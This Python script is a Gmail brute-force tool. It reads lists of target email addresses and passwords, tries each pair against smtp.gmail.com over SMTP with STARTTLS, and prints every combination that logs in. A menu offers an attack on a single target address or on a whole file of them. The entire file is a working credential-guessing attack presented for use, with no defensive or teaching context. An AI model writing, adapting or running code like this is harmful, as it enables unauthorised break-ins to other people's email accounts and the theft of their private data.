#!/usr/bin/python
from __future__ import absolute_import
from __future__ import print_function
import os
import smtplib

green = '\033[1;92m'

class GmailBruteForce():
    def __init__(self):
        self.accounts = []
        self.passwords = []
        self.init_smtplib()

    def get_acc_list(self,path):
        file = open(path, 'r',encoding='utf8').read().splitlines()
        for line in file:
            self.accounts.append(line)

    def get_pass_list(self,path):
        file = open(path, 'r',encoding='utf8').read().splitlines()
        for line in file:
            self.passwords.append(line)

    def init_smtplib(self):
        self.smtp = smtplib.SMTP("smtp.gmail.com",587)
        self.smtp.starttls()
        self.smtp.ehlo()
    
    def try_gmail(self):

        for user in self.accounts:
            for password in self.passwords:
                try:
                    self.smtp.login(user,password)
                    print(("\033[1;37mgood -> %s " % user + " -> %s \033[1;m" % password ))
                    self.smtp.quit()
                    self.init_smtplib()
                    break;
                except smtplib.SMTPAuthenticationError:
                    # print("\033[1;31msorry \033[1;m")
                    print(("\033[1;31msorry %s " % user + " -> %s \033[1;m" % password ))


instance = GmailBruteForce()

os.system("clear")
os.system("bash main/banner.sh")
print()
do = input('''\033[1;92m
	Choose here any one
	1 - Email file
	2 - target email
        0 - exit

	==> ''')



if do == '1':
    user = input("\033[1;92m[*] List Of Email ID => ")
    passfile = input("\033[1;92m[*] List Of Passwords => ")

    instance.get_acc_list(user)
    instance.get_pass_list(passfile)
    headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

    instance.try_gmail()

############
elif do == '2':
    user = input("\033[1;92m[*] Target Email ID: ")
    senha = input("\033[1;92m[*] Password list path: ")
    headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

    instance.accounts.append(user)
    instance.get_pass_list(senha)

    instance.try_gmail()
elif do == '0':
    print("\033[1;92mok, as you wish!")
    print("\033[1;92mExiting........")
    os.system("sleep 2.0")
else:
    print("\033[1;91mtry again")
    os.system("python gmanual.py")
